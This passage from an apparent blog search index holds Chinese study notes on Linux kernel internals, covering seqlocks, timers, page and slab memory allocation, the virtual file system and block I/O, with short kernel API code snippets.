}while(read_seqretry(&amp;sl, seq)) ```</p> </li> </ul> <ul> <li>\u4ee3\u7801\u4f4d\u4e8e include/linux/seqlock.h</li> </ul> <ul> <li>write_seqlock \u548c write_sequnlock \u90fd\u4f1a\u5c06 sl \u5185\u90e8\u7684 seq \u589e\u52a0 1</li> </ul> <ul> <li>\u5bf9\u4e8e\u5199\u8005\u6765\u8bf4\uff0c\u53ef\u4ee5\u76f4\u63a5\u8fdb\u5165\u4e34\u754c\u533a</li> </ul> <ul> <li>\u5bf9\u4e8e\u8bfb\u8005\u6765\u8bf4\uff0c\u5982\u679c\u7b2c\u4e00\u6b21\u8bfb\u53d6\u5230\u7684 seq \u662f\u5947\u6570\uff0c\u5219\u8bf4\u660e\u6709\u5199\u8005\u8fdb\u5165\u4e86\u4e34\u754c\u533a\uff0c\u9700\u8981\u91cd\u65b0\u8bfb\u3002\u6216\u8005\u7b2c\u4e00\u6b21\u8bfb\u53d6\u5230\u7684 seq \u548c\u7b2c\u4e8c\u6b21\u8bfb\u53d6\u5230\u7684\u4e0d\u4e00\u81f4\uff0c\u8bf4\u660e\u3002\u5728\u8bfb\u8005\u8fdb\u5165\u4e34\u754c\u533a\u540e\uff0c\u6709\u5199\u8005\u8fdb\u5165\u4e86\u4e34\u754c\u533a\uff0c\u4e5f\u9700\u8981\u91cd\u65b0\u8bfb\u3002</li> </ul> <ul> <li>\u4e3a\u4e86\u9632\u6b62\u6709\u591a\u4e2a\u5199\u8005\u8fdb\u5165\u4e34\u754c\u533a\uff0cwrite_seqlock \u4e2d\u4e5f\u4f7f\u7528\u4e86\u81ea\u9009\u9501\u5b9e\u73b0\u3002</li> </ul> </li> </ul> </li> </ul> <ul> <li> <p>\u4ee3\u7801\uff1a</p> <ul> <li>\u539f\u5b50\u6574\u6570\u64cd\u4f5c\uff1aarch/*/include/atomic.h</li> <li>\u81ea\u65cb\u9501\uff1aspinlock.h</li> <li>\u4fe1\u53f7\u91cf\uff1asemaphore.h\uff0crwsem.h</li> </ul> </li> </ul>","tags":["kernel","linux"]},{"location":"%E9%98%85%E8%AF%BB/2021/01/01/2021-01-01-linux%E5%86%85%E6%A0%B8%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0%E9%98%85%E8%AF%BB/#\u5b9a\u65f6\u5668\u548c\u65f6\u95f4\u7ba1\u7406","title":"\u5b9a\u65f6\u5668\u548c\u65f6\u95f4\u7ba1\u7406","text":"<ul> <li>\u7cfb\u7edf\u5b9a\u65f6\u5668\uff1a\u4e3a\u5185\u6838\u63d0\u4f9b\u4e00\u4e2a\u5468\u671f\u6027\u7684\u65f6\u949f\u4e2d\u65ad\uff0c\u8282\u62cd\u53ef\u4ee5\u8bbe\u7f6e<ul> <li>\u8282\u62cd(tick)\uff0c\u8282\u62cd\u7387 (tick rate) \u4e5f\u53eb HZ</li> <li>\u8282\u62cd\u7387\u4e00\u822c\u4e3a 1000\uff08\u65e9\u671f\u4e3a 100\uff09\uff0c\u4e0d\u540c\u4f53\u7cfb\u7ed3\u6784\u4e5f\u4e0d\u4e00\u6837</li> <li>\u8282\u62cd\u7387\u66f4\u9ad8\u53ef\u4ee5\u63d0\u9ad8\u65f6\u95f4\u9a71\u52a8\u4e8b\u4ef6\u7684\u89e3\u6790\u5ea6 resultion\uff08\u611f\u89c9\u53ef\u4ee5\u7406\u89e3\u4e3a\u7c92\u5ea6\uff09\uff0c\u5355\u4e5f\u4f1a\u5bfc\u81f4\u65f6\u949f\u4e2d\u65ad\u8d1f\u8f7d\u53d8\u5927\u3002</li> <li>\u4e0d\u4f7f\u7528\u5468\u671f\u65f6\u949f\uff1f\u6709\u4eba\u5c1d\u8bd5\u4f7f\u7528\u52a8\u6001\u7f16\u7a0b\u5b9a\u65f6\u5668\u6765\u9a71\u52a8\u4e00\u4e9b\u4e8b\u4ef6\uff08\u8bbe\u5b9a\u591a\u5c11\u65f6\u95f4\u540e\u89e6\u53d1\u4e2d\u65ad\uff09</li> </ul> </li> </ul> <ul> <li> <p>RTC \u5b9e\u65f6\u65f6\u949f\uff1a\u8bb0\u5f55\u5899\u4e0a\u65f6\u95f4\uff0c\u7528\u4e8e\u7cfb\u7edf\u542f\u52a8\u65f6\u521d\u59cb\u5316 xtime \u53d8\u91cf</p> <ul> <li> <p>\u5f53\u524d\u5b9e\u9645\u65f6\u95f4\uff08\u5899\u4e0a\u65f6\u95f4\uff09\u5b58\u50a8\u5728 xtime \u53d8\u91cf\u4e2d\uff0c\u5b9a\u4e49\u4e8e kernel/timer.c\u3002timespec \u5b9a\u4e49\u5728\u4e2d <pre><code>struct timespec xtime\nstruct timepsec{\n time_t tv_sec;\n long tv_nsec;\n}\n</code></pre> <ul> <li> <p>\u65f6\u949f\u4e2d\u65ad\u5904\u7406\u7a0b\u5e8f</p> <ul> <li>\u5206\u4e3a\u4f53\u7cfb\u7ed3\u6784\u76f8\u5173\u90e8\u5206\u548c\u65e0\u5173\u90e8\u5206 (do_timer) \u4e24\u90e8\u5206</li> <li>do_timer \u9700\u8981<ul> <li>\u5bf9 jiffies_64 \u52a0 1</li> <li>\u6267\u884c\u5230\u671f\u7684\u52a8\u6001\u5b9a\u65f6\u5668</li> <li>scheduler_tick()</li> </ul> </li> <li>\u6839\u636e\u4e2d\u65ad\u53d1\u751f\u5728\u7528\u6237\u7a7a\u95f4\u8fd8\u662f\u5185\u6838\u7a7a\u95f4\uff0c\u5c06\u4efb\u52a1\u7684\u7528\u6237\u65f6\u95f4\u548c\u7cfb\u7edf\u65f6\u95f4\u589e\u52a0 1\u3002\u7136\u800c\u7531\u4e8e\u5728\u4e00\u4e2a\u8282\u62cd\u671f\u95f4\u53ef\u80fd\u591a\u6b21\u8fdb\u5165\u548c\u9000\u51fa\u5185\u6838\uff0c\u56e0\u6b64\u5b9e\u9645\u4e0a\u5e76\u4e0d\u8db3\u591f\u7cbe\u786e\u3002</li> </ul> </li> </ul> <ul> <li>\u901a\u8fc7 sys_gettimeofday \u7cfb\u7edf\u8c03\u7528\u83b7\u5f97\u5899\u4e0a\u65f6\u95f4</li> </ul> <ul> <li> <p>\u5b9a\u65f6\u5668\uff08\u5185\u6838\u5b9a\u65f6\u5668\uff09(kernel/timer.c)</p> <ul> <li> <p>```c   struct timer_list my_timer;</p> <p>init_timer(&amp;my_timer);</p> <p>my_timer.expires = jiffies + delay; my_timer.data = 0; my_timer.function = my_function;</p> <p>add_timer(&amp;my_timer);</p> <p>mod_timer(&amp;my_timer, jiffies+new_delay); del_timer(&amp;my_timer);</p> <p>```</p> </li> </ul> <ul> <li> <p>\u5b9e\u73b0</p> <ul> <li> <p>\u65f6\u949f\u4e2d\u65ad\u5904\u7406\u7a0b\u5e8f\u6267\u884c update_process_timers()\uff0c\u8be5\u51fd\u6570\u8c03\u7528 run_local_timers()</p> <pre><code>void run_local_timers(){\n raise_softirq(TIMER_SOFTIRQ);\n}\n</code></pre> </li> </ul> <ul> <li>\u5373\u5b9a\u65f6\u5668\u4f5c\u4e3a\u8f6f\u4e2d\u65ad\u5728\u4e0b\u534a\u90e8\u4e2d\u6267\u884c</li> </ul> </li> </ul> <ul> <li>\u4e0d\u80fd\u4f7f\u7528\u5b9a\u65f6\u5668\u6765\u5b9e\u73b0\u786c\u5b9e\u65f6\u4efb\u52a1</li> </ul> </li> </ul> <ul> <li> <p>\u5b9e\u73b0\u5ef6\u8fdf\u6267\u884c</p> <ul> <li> <p>\u5fd9\u7b49\u5f85</p> <ul> <li> <p>\u4e0b\u9762\u7684\u4ee3\u7801\u5ef6\u8fdf\u4e24\u79d2</p> <pre><code>unsigned long delay = jiffies + 2*HZ;\nwhile(time_before(jiffies, delay))\n ;\n</code></pre> </li> </ul> <ul> <li>C \u7f16\u8bd1\u5668\u901a\u5e38\u53ea\u4f1a\u5c06\u53d8\u91cf load \u4e00\u6b21\uff0c\u8fd9\u6837\u7684\u8bdd\u4e0a\u9762\u7684\u4ee3\u7801\u4f7f\u7528\u7684 jiffies \u5c31\u4e0d\u5bf9\uff08jiffies \u5728\u540e\u53f0\u968f\u65f6\u949f\u4e2d\u65ad\u4e0d\u65ad\u88ab\u66f4\u65b0\uff09\u3002\u56e0\u6b64\u9700\u8981\u4f7f\u7528 volatile\uff0c\u5173\u952e\u5b57 volatile \u6307\u793a\u7f16\u8bd1\u5668\u5728\u6bcf\u6b21\u8bbf\u95ee\u53d8\u91cf\u65f6\u90fd\u91cd\u65b0\u91cd\u5185\u5b58\u4e2d\u8bfb\u53d6\u3002</li> </ul> </li> </ul> <ul> <li> <p>\u77ed\u5ef6\u8fdf</p> <ul> <li>\u5982\u679c\u9700\u8981\u5ef6\u8fdf\u7684\u65f6\u95f4\u77ed\u4e8e\u4e00\u4e2a\u8282\u62cd</li> </ul> <ul> <li>\u5185\u6838\u4e2d\u63d0\u4f9b\u5ef6\u8fdf\u5fae\u79d2\u548c\u6beb\u79d2\u7684\u51fd\u6570 udelay \u548c mdelay\uff08linux/delay.h\uff09</li> </ul> <ul> <li>udelay \u901a\u8fc7\u6267\u884c\u6570\u6b21\u5faa\u73af\u5b9e\u73b0\uff0c\u800c\u4e0d\u662f jiffies</li> </ul> <ul> <li> <p>BogoMIPS</p> <ul> <li>\u5185\u6838\u5728\u542f\u52a8\u65f6\u5229\u7528 calibrate_delay \u8ba1\u7b97 loops_per_jiffy\uff0c\u4f4d\u4e8e init/main.c</li> </ul> <ul> <li> <p>BogoMIPS \u8868\u793a\u5904\u7406\u5668\u6267\u884c\u7a7a\u5faa\u73af\u65f6\uff0c\u6267\u884c\u6307\u4ee4\u7684\u901f\u5ea6\uff08\u76f8\u5f53\u4e8e CPU \u9891\u7387\uff09\uff0c\u5355\u4f4d\uff1a\u767e\u4e07/s</p> <p>\u56e0\u6b64\uff1aBogoMIPS = loops_per_jiffy * HZ / 500000\u3002\u56e0\u4e3a\u4e00\u4e2a loop \u9700\u8981\u4e24\u6761\u6307\u4ee4\u3002</p> </li> </ul> </li> </ul> <ul> <li>\u73b0\u5728\u4e00\u822c\u4f7f\u7528\u786c\u4ef6\u5b9a\u65f6\u5668\u5b9e\u73b0\uff0c\u66f4\u52a0\u7cbe\u786e\u3002\uff08CPU \u9891\u7387\u4f1a\u53d8\u5316\uff09</li> </ul> </li> </ul> </li> </ul>","tags":["kernel","linux"]},{"location":"%E9%98%85%E8%AF%BB/2021/01/01/2021-01-01-linux%E5%86%85%E6%A0%B8%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0%E9%98%85%E8%AF%BB/#\u5185\u5b58\u7ba1\u7406","title":"\u5185\u5b58\u7ba1\u7406","text":"<ul> <li> <p>struct page:  <p>\u5185\u6838\u7ed9\u6bcf\u4e2a\u7269\u7406\u9875\u90fd\u5206\u914d\u4e00\u4e2a page \u7ed3\u6784\u4f53\u3002\u867d\u7136\u770b\u4e0a\u53bb\u5f88\u6d88\u8017\u5185\u5b58\uff0c\u4f46\u662f\u5b9e\u9645\u4e0a\u4e0d\u5230 1/100\uff0c\u5e76\u4e14\u662f\u503c\u5f97\u7684\u3002</p> <ul> <li> <p>struct zone:  <ul> <li>\u4e0d\u540c\u4f53\u7cfb\u7ed3\u6784 zone \u7684\u5212\u5206\u4e0d\u4e00\u6837</li> <li>ZONE_NORMAL</li> <li>ZONE_DMA\uff1aDMA \u53ef\u4ee5\u4f7f\u7528\u7684</li> <li>ZONE_HIGHMEM\uff1a\u65e0\u6cd5\u6c38\u4e45\u6620\u5c04\u5230\u5185\u6838\u5730\u5740\u7a7a\u95f4</li> </ul> <ul> <li>\u5185\u6838\u542f\u52a8\u65f6\u521d\u59cb\u5316\uff1amm/page_alloc.c</li> </ul> <ul> <li> <p>\u8bf7\u6c42\u5185\u5b58\u7684\u5e95\u5c42\u673a\u5236\uff0c\u4ee5\u9875\u4e3a\u5355\u4f4d\u8bf7\u6c42\u5185\u5b58\uff1a <p>\u5206\u914d 2^order \u4e2a\u8fde\u7eed\u7684\u7269\u7406\u9875\uff0c\u5e76\u8fd4\u56de\u7b2c\u4e00\u4e2a\u9875\u5bf9\u5e94 page \u6307\u9488</p> <pre><code>struct page * alloc_pages(unsigned int gfp_mask, unsigned int order)\n</code></pre> <p>\u628a\u7ed9\u5b9a\u7684\u9875\u8f6c\u6362\u6210\u903b\u8f91\u5730\u5740</p> <pre><code>void *page_address(struct page *page)\n</code></pre> <p>\u76f4\u63a5\u8fd4\u56de\u8bf7\u6c42\u7684\u7b2c\u4e00\u4e2a\u9875\u7684\u903b\u8f91\u5730\u5740</p> <pre><code>unsigned long __get_free_pages(unsigned int gfp_mask, unsigned int order)\n</code></pre> <p>\u83b7\u5f97\u4e00\u4e2a\u9875</p> <pre><code>struct page*alloc_page(unsigned int gfp_mask)\n</code></pre> <p>\u91ca\u653e</p> <pre><code>void __free_pages(struct page *page, unsigned int order)\nvoid free_pages(unsigned long addr, unsigned int order)\nvoid free_page(unsigned long addr)\n</code></pre> <ul> <li> <p>kmalloc\uff1a <ul> <li><code>c   void *kmallock(size_t size, int flags)</code></li> </ul> <ul> <li>\u83b7\u5f97\u4ee5\u5b57\u8282\u4e3a\u5355\u4f4d\u7684\u4e00\u5757\u8fde\u7eed\u7684\u5185\u6838\u5185\u5b58</li> </ul> <ul> <li> <p>flag</p> <ul> <li>\u884c\u4e3a\u4fee\u9970\u7b26\uff1a\u5982\u4e0d\u80fd\u7761\u7720</li> <li>\u533a\u4fee\u9970\u7b26</li> </ul> </li> </ul> <ul> <li>kfree\uff1a\u91ca\u653e\u4e0d\u662f kmalloc \u5206\u914d\u7684\u6216\u5219\u5df2\u7ecf\u88ab\u91ca\u653e\u7684\u5185\u5b58\u53ef\u80fd\u5bfc\u81f4\u4e25\u91cd\u7684\u540e\u679c</li> </ul> <ul> <li> <p>vmalloc</p> <ul> <li>\u865a\u62df\u5730\u5740\u662f\u8fde\u7eed\u7684\uff0c\u800c\u7269\u7406\u5730\u5740\u65e0\u9700\u8fde\u7eed\u3002</li> <li>vmalloc \u4e00\u822c\u5728\u83b7\u5f97\u5927\u5757\u5185\u5b58\u65f6\u4f7f\u7528\uff1a\u9700\u8981\u5efa\u7acb\u9875\u8868\u9879\uff0c\u6027\u80fd\u4f4e</li> </ul> </li> </ul> <ul> <li> <p>slab \u5206\u914d\u5668</p> <ul> <li> <p>\u4f5c\u7528\uff1a\u907f\u514d\u9891\u7e41\u5206\u914d\u548c\u91ca\u653e\u9875\u3002</p> <ul> <li>slab \u8d1f\u8d23\u5e95\u5c42\u7684\u5bf9\u9f50\u3001\u7740\u8272\u3001\u5206\u914d\u3001\u91ca\u653e\u7b49\u7b49</li> <li>\u5982\u679c\u9700\u8981\u9891\u7e41\u521b\u5efa\u5f88\u591a\u76f8\u540c\u7c7b\u578b\u7684\u5bf9\u8c61\uff0c\u5e94\u8be5\u4f7f\u7528 slab\uff0c\u800c\u4e0d\u662f\u81ea\u5df1\u521b\u5efa\u7a7a\u95f2\u94fe\u8868\u3002</li> </ul> </li> </ul> <ul> <li> <p>\u6bd4\u8f83\u7279\u6b8a\u7684\u51e0\u70b9</p> <ul> <li>\u8ba9\u90e8\u5206\u7f13\u5b58\u4e13\u5c5e\u4e8e\u5355\u4e2a\u5904\u7406\u5668\uff0c\u90a3\u4e48\u5206\u914d\u548c\u91ca\u653e\u5c31\u53ef\u4ee5\u5728\u4e0d\u52a0 SMP \u9501\u7684\u60c5\u51b5\u4e0b\u8fdb\u884c</li> <li>\u5bf9\u5b58\u653e\u7684\u5bf9\u8c61\u8fdb\u884c\u7740\u8272 (colored)\uff0c\u53ef\u4ee5\u9632\u6b62\u591a\u4e2a\u5bf9\u8c61\u6620\u5c04\u5230\u76f8\u540c\u7684 cache line</li> </ul> </li> </ul> <ul> <li> <p>\u539f\u7406\uff1a</p> <ul> <li>\u9891\u7e41\u4f7f\u7528\u7684\u6570\u636e\u7ed3\u6784\u4f1a\u88ab\u9891\u7e41\u5206\u914d\u548c\u91ca\u653e\uff0c\u56e0\u6b64\u9700\u8981\u7f13\u5b58\u5b83\u4eec\u3002</li> <li>\u4f7f\u7528\u4e0d\u540c\u7684 cache \u6765\u7f13\u5b58\u4e0d\u540c\u7684\u5bf9\u8c61\uff0c\u5982\u7528\u4e8e\u5b58\u653e\u8fdb\u7a0b\u63cf\u8ff0\u7b26\uff0c\u7d22\u5f15\u8282\u70b9\u7684\u5bf9\u8c61</li> <li>cache \u7531\u82e5\u5e72\u4e2a slab \u7ec4\u6210\uff0c\u4e00\u4e2a slab \u5305\u542b\u82e5\u5e72\u4e2a\u8fde\u7eed\u7684\u7269\u7406\u9875</li> <li>slab \u53ef\u80fd\u4e3a\u5904\u4e8e\uff1a\u6ee1\uff0c\u90e8\u5206\u6ee1\uff0c\u7a7a\u4e09\u79cd\u72b6\u6001\u4e4b\u4e00\u3002\u4f18\u5148\u5728\u90e8\u5206\u6ee1\u7684 slab \u4e2d\u5206\u914d\u5bf9\u8c61\u3002</li> </ul> </li> </ul> <ul> <li> <p>\u63a5\u53e3</p> <ul> <li> <p>\u521b\u5efa\u4e00\u4e2a cache</p> <pre><code>kmem_cache_t *kmem_cache_create(const char *name, size_t size,\n                                size_t align, unsigned long flags,\n                                void (*ctor)(void *, kmem_cache_t *, unsigned long),\n                                void (*ctor)(void *, kmem_cache_t *, unsigned long))\n</code></pre> <ul> <li>size \u4e3a\u5bf9\u8c61\u7684\u5927\u5c0f</li> </ul> <ul> <li>align \u4e3a\u7b2c\u4e00\u4e2a\u5bf9\u8c61\u7684\u504f\u79fb\uff0c\u901a\u5e38\u4e3a 0</li> </ul> <ul> <li> <p>flags</p> <ul> <li> <p>SLAB_HWCACHE_ALGIN\uff1a\u547d\u4ee4 slab \u5c42\u628a\u6bcf\u4e00\u4e2a\u5bf9\u8c61\u6309 cache line \u5bf9\u9f50\uff0c\u9632\u6b62\u4e24\u4e2a\u5bf9\u8c61\u5730\u5740\u4e0d\u540c\u4f46\u6620\u5c04\u5230\u76f8\u540c\u7684 cache line</p> <p>\u6ce8\uff1a\u4e0d\u592a\u660e\u767d\uff0ccache line \u5927\u5c0f\u5bf9\u9f50\u4e0d\u4ecd\u7136\u4f1a\u6620\u5c04\u51b2\u7a81\u5417\uff1f</p> </li> </ul> <ul> <li>SLAB_POISON\uff1a\u4f7f\u7528\u5df2\u77e5\u7684\u503c\u586b\u5145 slab</li> </ul> <ul> <li>SLAB_PANIC\uff1a\u5206\u914d\u5931\u8d25\u65f6\u4f53\u5f62 slab \u5c42\u3002\u5728\u8981\u6c42\u5206\u914d\u5fc5\u987b\u6210\u529f\u65f6\u6709\u7528\uff0c\u6bd4\u5982\u7cfb\u7edf\u542f\u52a8\u65f6\u5206\u914d VMA \u7ed3\u6784\u7684 cache\u3002</li> </ul> </li> </ul> </li> </ul> <ul> <li> <p>\u521b\u5efa cache \u540e\uff0c\u83b7\u5f97\u4e00\u4e2a\u5bf9\u8c61</p> <pre><code>void *kmem_cache_alloc(kmem_cache_t *cachep, int flags)\n</code></pre> <p>\u5982\u679c cache \u4e2d\u6240\u6709 slab \u90fd\u6ca1\u6709\u7a7a\u95f2\u7684\u5bf9\u8c61\uff0c\u5219\u901a\u8fc7 kmem_getpages \u83b7\u53d6\u65b0\u7684\u9875\u3002</p> <pre><code>void *kmem_cache_alloc(kmem_cache_t *cachep, void *objp)\n</code></pre> </li> </ul> </li> </ul> <ul> <li> <p>\u5185\u6838\u6808</p> <ul> <li>\u4e0d\u50cf\u7528\u6237\u8fdb\u7a0b\uff0c\u6808\u7684\u5927\u5c0f\u53ef\u4ee5\u52a8\u6001\u589e\u957f\uff0c\u5185\u6838\u6808\u7684\u5927\u5c0f\u662f\u56fa\u5b9a\u7684\u3002</li> <li>\u6bcf\u4e2a\u8fdb\u7a0b\u90fd\u6709\u4e00\u4e2a\u5185\u6838\u6808\uff08\u5185\u6838\u8fd0\u884c\u5728\u8fdb\u7a0b\u4e0a\u4e0b\u6587\uff09\uff0c\u5185\u6838\u6808\u7684\u5927\u5c0f\u4e00\u822c\u662f\u4e24\u4e2a\u9875\u3002\uff08\u53ef\u4ee5\u7f16\u8bd1\u65f6\u914d\u7f6e\u4e3a 1 \u4e2a\u9875\uff09</li> <li>\u5728\u8fc7\u53bb\uff0c\u4e2d\u65ad\u5904\u7406\u7a0b\u5e8f\u548c\u88ab\u4e2d\u65ad\u8fdb\u7a0b\u5171\u4eab\u5185\u6838\u6808\uff0c\u4e4b\u540e\u5f15\u5165\u4e86\u4e2d\u65ad\u6808\uff0c\u6bcf\u4e2a\u8fdb\u7a0b\u6709\u4e00\u4e2a\u4e2d\u65ad\u6808</li> </ul> </li> </ul> </li> </ul>","tags":["kernel","linux"]},{"location":"%E9%98%85%E8%AF%BB/2021/01/01/2021-01-01-linux%E5%86%85%E6%A0%B8%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0%E9%98%85%E8%AF%BB/#\u865a\u62df\u6587\u4ef6\u7cfb\u7edf","title":"\u865a\u62df\u6587\u4ef6\u7cfb\u7edf","text":"<ul> <li>\u590d\u4e60<ul> <li>\u78c1\u76d8\u7ed3\u6784<ul> <li>CHS geometry</li> <li>Logic Block Address</li> </ul> </li> <li>\u5206\u533a\u683c\u5f0f\uff1aMBR, GPT<ul> <li>MBR \u5206\u533a\u683c\u5f0f\u5728 fdisk, parted \u7b49\u5de5\u5177\u4e2d\u4e00\u822c\u6807\u8bb0\u4e3a dos \u683c\u5f0f</li> <li>MBR(Master boot record) \u4f4d\u4e8e\u7b2c\u4e00\u4e2a\u6247\u533a\uff0c\u56e0\u6b64\u5206\u533a\u8868\u4e0d\u80fd\u592a\u5927\uff0c\u6700\u591a\u652f\u6301 4 \u4e2a primary \u5206\u533a\uff0c\u5982\u679c\u9700\u8981\u591a\u4e8e 4 \u4e2a\u5206\u533a\uff0c\u5219\u9700\u8981\u4f7f\u7528 extend \u5206\u533a+logic \u5206\u533a\u7684\u65b9\u5f0f\u3002</li> <li>MBR \u4e5f\u9650\u5236\u4e86\u6700\u5927\u53ea\u80fd\u652f\u6301 2TB \u7684\u78c1\u76d8</li> </ul> </li> <li>\u6587\u4ef6\u7cfb\u7edf</li> </ul> </li> </ul> <ul> <li>VFS \u4f5c\u7528\uff1a\u63d0\u4f9b\u7edf\u4e00\u63a5\u53e3\uff0c\u652f\u6301\u4e0d\u540c\u6587\u4ef6\u7cfb\u7edf</li> </ul> <ul> <li> <p>Unix \u6587\u4ef6\u7cfb\u7edf\u91c7\u7528\u4e86\u9762\u5411\u5bf9\u8c61\u8bbe\u8ba1\u98ce\u683c\uff0c\u4f7f\u7528\u4e86 4 \u4e2d\u4e0d\u540c\u6570\u636e\u7ed3\u6784\uff1a\u8d85\u7ea7\u5757\u3001\u7d22\u5f15\u8282\u70b9\u3001\u76ee\u5f55\u9879\u3001\u6587\u4ef6\u5bf9\u8c61\uff0c\u6bcf\u79cd\u6570\u636e\u7ed3\u6784\u90fd\u5305\u542b\u5bf9\u5176\u8fdb\u884c\u64cd\u4f5c\u7684\u51fd\u6570</p> <ul> <li>\u5176\u4e2d\u8d85\u7ea7\u5757\u3001\u7d22\u5f15\u8282\u70b9\u5728 Unix \u98ce\u683c\u7684\u6587\u4ef6\u7cfb\u7edf\u4e2d\u6709\u5bf9\u5e94\u7684\u78c1\u76d8\u6570\u636e\u7ed3\u6784</li> <li>\u5982\u679c\u8981\u652f\u6301\u975e Unix \u98ce\u683c\u7684\u6587\u4ef6\u7cfb\u7edf\uff0c\u5219\u4ecd\u7136\u9700\u8981\u5728\u5185\u5b58\u4e2d\u6784\u9020\u54cd\u5e94\u6570\u636e\u7ed3\u6784</li> <li>\u5185\u5b58\u4e2d\u7684\u6570\u636e\u7ed3\u6784\u76f8\u6bd4\u78c1\u76d8\u4e2d\u7684\u4f1a\u591a\u4e00\u4e9b\u63a7\u5236\u4fe1\u606f</li> </ul> </li> </ul> <ul> <li> <p>\u8d85\u7ea7\u5757\uff1a\u5305\u542b\u6587\u4ef6\u7cfb\u7edf\u7684\u63a7\u5236\u4fe1\u606f\u3002\u4e5f\u53eb\u6587\u4ef6\u7cfb\u7edf\u63a7\u5236\u5757\u3002</p> <ul> <li>\u5f53\u4e00\u4e2a\u6587\u4ef6\u7cfb\u7edf\u88ab\u6302\u8f7d\u5230\u4e00\u4e2a\u76ee\u5f55\u65f6\uff0c\u5185\u6838\u901a\u8fc7 alloc_super \u521b\u5efa\u8d85\u7ea7\u5757\uff0c\u5e76\u586b\u5145\u76f8\u5173\u6570\u636e\uff08\u4ece\u78c1\u76d8\u8bfb\u53d6\uff09</li> </ul> </li> </ul> <ul> <li> <p>\u7d22\u5f15\u8282\u70b9 inode</p> <ul> <li> <p>\u7d22\u5f15\u8282\u70b9\u5b58\u50a8\u6587\u4ef6\u7684\u5143\u6570\u636e\uff08\u5982\u63a7\u5236\u6743\u9650\uff0c\u5927\u5c0f\uff0c\u62e5\u6709\u8005\uff0c\u521b\u5efa\u65f6\u95f4\uff09</p> <ul> <li>Unix \u5c06\u6587\u4ef6\u4fe1\u606f\u548c\u6587\u4ef6\u672c\u8eab\u5206\u522b\u5b58\u50a8</li> </ul> </li> </ul> <ul> <li> <p>Unix \u98ce\u683c\u7684\u6587\u4ef6\u7cfb\u7edf\u4e2d\uff0c\u7d22\u5f15\u8282\u70b9\u5b58\u50a8\u5728\u78c1\u76d8\u5355\u72ec\u7684\u5757\u4e2d</p> <ul> <li>\u6ca1\u6709\u7d22\u5f15\u8282\u70b9\u7684\u6587\u4ef6\u7cfb\u7edf\u901a\u5e38\u5c06\u4fe1\u606f\u4f5c\u4e3a\u6587\u4ef6\u7684\u4e00\u90e8\u5206\u5b58\u50a8\u8d77\u6765</li> </ul> </li> </ul> <ul> <li>\u76ee\u5f55\u88ab\u5f53\u4f5c\u4e00\u79cd\u7279\u6b8a\u7684\u6587\u4ef6\uff0c\u53ef\u4ee5\u50cf\u6587\u4ef6\u4e00\u6837\u8fdb\u884c\u64cd\u4f5c</li> </ul> <ul> <li> <p>\u67e5\u627e\u6587\u4ef6</p> <p>It starts at the beginning of the path name and looks up the inode of the first directory in the path. Then it uses that inode to look up the next directory in the path. When it reachs the end, it has found the inode of the file or directory it is trying to look up. But since it needs an <code>inode</code> to get started, how does it get started with the first lookup? There is an inode pointer kept in the superblock called <code>s_mounted</code> which points at an inode structure for the filesystem. T</p> </li> </ul> </li> </ul> <ul> <li> <p>\u76ee\u5f55\u9879 dentry</p> <ul> <li>\u6307\u5411\u4e00\u4e2a inode</li> </ul> </li> </ul> <ul> <li> <p>\u76ee\u5f55\u9879\u7f13\u5b58 dcache</p> <ul> <li>\u7528\u4e8e\u5feb\u901f\u8def\u5f84\u89e3\u6790</li> </ul> </li> </ul> <ul> <li> <p>\u6587\u4ef6\u5bf9\u8c61</p> <ul> <li>\u8fdb\u7a0b\u6253\u5f00\u4e00\u4e2a\u6587\u4ef6\u65f6\u521b\u5efa\uff0c\u5305\u542b\u6587\u4ef6\u5f53\u524d\u4f4d\u7f6e\u3001\u8bbf\u95ee\u6a21\u5f0f\u7b49\u4fe1\u606f\u3002</li> <li>\u73b0\u5728\u8fd8\u4e0d\u6e05\u695a\uff0c\u6587\u4ef6\u5bf9\u8c61\u662f\u4e0d\u662f\u6bcf\u4e2a\u8fdb\u7a0b\u79c1\u6709\u7684\u3002</li> <li>\u5b9e\u73b0\u6587\u4ef6\u5171\u4eab\uff1a\u4e0d\u540c\u8fdb\u7a0b\u7684\u6587\u4ef6\u5bf9\u8c61\u53ef\u4ee5\u6307\u5411\u76f8\u540c\u7684 dentry \u548c inode</li> </ul> </li> </ul>","tags":["kernel","linux"]},{"location":"%E9%98%85%E8%AF%BB/2021/01/01/2021-01-01-linux%E5%86%85%E6%A0%B8%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0%E9%98%85%E8%AF%BB/#\u5757-io-\u5c42","title":"\u5757 I/O \u5c42","text":"<ul> <li>\u5b57\u7b26\u8bbe\u5907\u592a\u7b80\u5355\uff0c\u56e0\u6b64\u6ca1\u6709\u5b50\u7cfb\u7edf\u3002\u800c\u5757\u8bbe\u5907\u6709</li> <li>\u6247\u533a\u662f\u5757\u8bbe\u5907\u7684\u6700\u5c0f\u5bfb\u5740\u5355\u5143\uff0c\u901a\u5e38\u4e3a 512 \u5b57\u8282\u3002<ul> <li>\u53ef\u4ee5\u53eb\u505a\uff1a\u8bbe\u5907\u5757</li> </ul> </li> <li>\u5757\u662f\u6587\u4ef6\u7cfb\u7edf\u7684\u6700\u5c0f\u5bfb\u5740\u5355\u5143\uff0c\u901a\u5e38\u4e3a 512B, 1KB \u6216 4KB\u3002<ul> <li>\u53ef\u4ee5\u53eb\u505a\uff1a\u6587\u4ef6\u5757\uff0cI/O \u5757</li> </ul> </li> </ul>","tags":["kernel","linux"]},{"location":"%E9%98%85%E8%AF%BB/2021/01/01/2021-01-01-linux%E5%86%85%E6%A0%B8%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0%E9%98%85%E8%AF%BB/#\u8fdb\u7a0b\u5730\u5740\u7a7a\u95f4","title":"\u8fdb\u7a0b\u5730\u5740\u7a7a\u95f4","text":"<p>Linux \u5185\u6838\u5b8c\u5168\u6ce8\u91ca -0.12-v5.0-\u8d75\u70af</p> <ul> <li>\u6c47\u7f16\u4e2d\u4efb\u4f55\u4e00\u4e2a\u5730\u5740\u5f15\u7528\u90fd\u53ef\u8868\u793a\u4e3a\u8be5\u6587\u4ef6\u4e2d{\u533a\u5730\u5740 + 